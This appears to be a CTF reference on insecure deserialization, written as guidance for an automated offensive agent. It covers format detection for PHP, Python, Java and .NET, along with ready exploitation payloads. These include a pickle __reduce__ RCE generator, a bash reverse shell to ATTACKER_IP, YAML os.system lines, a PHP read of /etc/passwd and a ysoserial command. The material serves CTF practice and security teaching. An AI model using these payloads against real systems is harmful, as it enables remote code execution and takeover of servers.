# Insecure Deserialization - CTF Exploitation Reference

> **Document Purpose:** Actionable deserialization attack techniques for CTF challenges.
> Covers PHP, Python, Java, and .NET deserialization with detection indicators,
> exploitation payloads, and format identification.

---

## 1. QUICK REFERENCE: Format Identification

> **When to use this section:** You see encoded/serialized data and need to
> identify the serialization format.

### 1.1 Format Detection by Signature

**Tags:** `deserialization, detection, format, identification, magic-bytes`

| Signature | Format | Example |
|-----------|--------|---------|
| `O:N:"` | PHP serialized object | `O:4:"User":2:{s:4:"name";s:5:"admin";}` |
| `a:N:{` | PHP serialized array | `a:2:{s:3:"key";s:5:"value";}` |
| `s:N:"` | PHP serialized string | `s:5:"hello"` |
| `rO0AB` | Java serialized (base64) | Base64-encoded Java object |
| `aced0005` | Java serialized (hex) | Raw Java serialization magic bytes |
| `gASV` | Python pickle (base64) | Base64-encoded pickle data |
| `\x80\x03` or `\x80\x04` | Python pickle (raw) | Pickle protocol 3/4 |
| `AAEAAAD` | .NET BinaryFormatter (base64) | Base64-encoded .NET object |
| `__VIEWSTATE` | .NET ViewState | ASP.NET hidden form field |
| `!!python/` | YAML (Python) | `!!python/object/apply:os.system ['id']` |

### 1.2 Common Locations

**Tags:** `deserialization, locations, cookies, parameters`

Check these locations for serialized data:
- **Cookies** (especially PHP sessions, Java `JSESSIONID`, .NET `__VIEWSTATE`)
- **Hidden form fields** (`.NET ViewState`, `__VIEWSTATE`)
- **URL parameters** (base64-encoded blobs)
- **Request body** (POST data, JSON with encoded values)
- **HTTP headers** (custom headers, `Authorization`)

**Agent Takeaway:**
- Look for base64 blobs in cookies and parameters — decode and check format
- PHP serialized data starts with `O:`, `a:`, or `s:` — very distinctive
- Java serialized data starts with `rO0AB` (base64) or `aced0005` (hex)
- Use `deserialization_probe` tool for automated detection

---

## 2. PHP DESERIALIZATION

> **When to use this section:** Target is a PHP application with serialized
> objects in cookies, parameters, or POST data.

### 2.1 PHP Serialization Format

**Tags:** `deserialization, php, format, unserialize`

```
s:5:"hello"              → string "hello" (length 5)
i:42                      → integer 42
b:1                       → boolean true
a:2:{s:1:"a";i:1;s:1:"b";i:2;}  → array ["a"=>1, "b"=>2]
O:4:"User":1:{s:4:"name";s:5:"admin";}  → object User with name="admin"
```

### 2.2 Magic Methods for Exploitation

**Tags:** `deserialization, php, magic-methods, exploitation`

PHP calls these methods automatically during deserialization:
- `__wakeup()` — called when object is unserialized
- `__destruct()` — called when object is destroyed
- `__toString()` — called when object is used as string
- `__call()` — called when undefined method is invoked

### 2.3 PHP Exploitation Payloads

**Tags:** `deserialization, php, payloads, rce, file-read`

**File read via SplFileObject:**
```
O:13:"SplFileObject":1:{s:8:"\x00*\x00file";s:11:"/etc/passwd";}
```

**Modifying existing objects (privilege escalation):**
```
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
```

**POP chain template (generic):**
```php
// Find classes with __destruct or __wakeup that call other methods
// Chain: __destruct() → method_a() → method_b() → system()
```

**Agent Takeaway:**
- PHP deserialization is the MOST common in CTFs
- Look for `O:N:` or `a:N:{` patterns in cookies or parameters
- Often the exploit is just changing a field value (role: user → admin)
- Complex exploits require POP chains — use `deserialization_payload_generator`
- The `unserialize()` function is the vulnerable sink

---

## 3. PYTHON DESERIALIZATION

> **When to use this section:** Target is a Python application using pickle
> for session management or data storage.

### 3.1 Pickle Detection

**Tags:** `deserialization, python, pickle, detection`

- Base64-decoded data starts with `\x80\x03` or `\x80\x04` (pickle protocol)
- Error messages mention `pickle`, `unpickle`, `cPickle`
- Python/Flask/Django backends with encoded session cookies
- YAML files with `!!python/` tags

### 3.2 Pickle RCE Payloads

**Tags:** `deserialization, python, pickle, rce, payloads`

**Basic RCE via `__reduce__`:**
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

**Common commands to execute:**
```python
# Read flag
return (os.system, ('cat /flag.txt',))

# Reverse shell
return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"',))

# Write to web root
return (os.system, ('cp /flag.txt /var/www/html/flag.txt',))
```

### 3.3 YAML Deserialization

**Tags:** `deserialization, python, yaml, rce`

```yaml
!!python/object/apply:os.system ['id']
!!python/object/apply:subprocess.check_output [['cat', '/flag.txt']]
!!python/object/new:subprocess.check_output [['id']]
```

**Agent Takeaway:**
- Pickle is inherently unsafe — ANY pickle data can execute arbitrary code
- The payload is simple: define `__reduce__` to return `(os.system, ('command',))`
- Use `deserialization_payload_generator` with `python_payloads` for ready-to-use payloads
- YAML with `!!python/` tags is equivalent to pickle in danger

---

## 4. JAVA DESERIALIZATION

> **When to use this section:** Target is a Java application with serialized
> objects.

### 4.1 Java Detection

**Tags:** `deserialization, java, detection, objectinputstream`

- Base64 data starting with `rO0AB` (Java serialization magic: `ac ed 00 05`)
- Content-Type: `application/x-java-serialized-object`
- Error messages: `ObjectInputStream`, `ClassNotFoundException`, `InvalidClassException`
- `readObject()` in stack traces

### 4.2 ysoserial Gadget Chains

**Tags:** `deserialization, java, ysoserial, gadget-chains`

**Usage:**
```bash
java -jar ysoserial.jar CommonsCollections1 'cat /flag.txt' | base64
```

**Common gadget chains:**
| Chain | Library Required |
|-------|-----------------|
| CommonsCollections1-7 | Apache Commons Collections 3.x/4.x |
| Spring1-2 | Spring Framework |
| Hibernate1 | Hibernate ORM |
| JRMPClient | JDK (built-in) |
| Groovy1 | Apache Groovy |
| BeanShell1 | BeanShell |

### 4.3 Quick Test

**Tags:** `deserialization, java, testing`

Send truncated/modified serialized data and look for:
- `InvalidClassException` → deserialization is happening
- `ClassNotFoundException` → class lookup during deserialization
- Stack trace with `readObject()` → confirms `ObjectInputStream` usage

**Agent Takeaway:**
- Java deserialization requires the right library on the classpath
- Use ysoserial to generate payloads for specific gadget chains
- `CommonsCollections` chains are the most commonly exploitable
- Use `deserialization_payload_generator` with `java_references` for chain details

---

## 5. .NET DESERIALIZATION

> **When to use this section:** Target is an ASP.NET application.

### 5.1 .NET Detection

**Tags:** `deserialization, dotnet, viewstate, detection`

- `__VIEWSTATE` hidden form field (ASP.NET WebForms)
- Base64 data starting with `AAEAAAD/////`
- Error messages: `ObjectStateFormatter`, `BinaryFormatter`, `LosFormatter`
- `.aspx` pages with ViewState

### 5.2 ViewState Exploitation

**Tags:** `deserialization, dotnet, viewstate, exploitation`

If ViewState MAC validation is disabled:
1. Decode the `__VIEWSTATE` value (base64)
2. Modify the deserialized object
3. Re-serialize and re-encode
4. Submit modified ViewState

**Tool:** ysoserial.net for .NET gadget chains

**Agent Takeaway:**
- .NET deserialization is less common in CTFs than PHP/Python
- `__VIEWSTATE` is the most common attack surface
- Modern ASP.NET has MAC validation enabled by default — check if disabled
- Use `deserialization_probe` with `format: "dotnet"` for detection

---

## 6. EXPLOITATION DECISION TREE

**Tags:** `deserialization, workflow, decision-tree`

```
1. Identify serialized data (cookies, params, body)
2. Determine format:
   - Starts with O: or a: → PHP
   - Base64 decodes to \x80\x03 → Python pickle
   - Starts with rO0AB → Java
   - __VIEWSTATE → .NET
3. For PHP:
   - Try modifying field values (role, admin, etc.)
   - Look for POP chains in source code
4. For Python:
   - Generate pickle RCE payload with __reduce__
   - Base64 encode and submit
5. For Java:
   - Identify available libraries
   - Use ysoserial with matching gadget chain
6. For .NET:
   - Check if ViewState MAC is disabled
   - Use ysoserial.net if applicable
```

**Agent Takeaway:**
- PHP deserialization: often just modify field values (easiest)
- Python pickle: always leads to RCE (most dangerous)
- Java: requires specific library versions (most complex)
- Always start with `deserialization_probe` for automated format detection
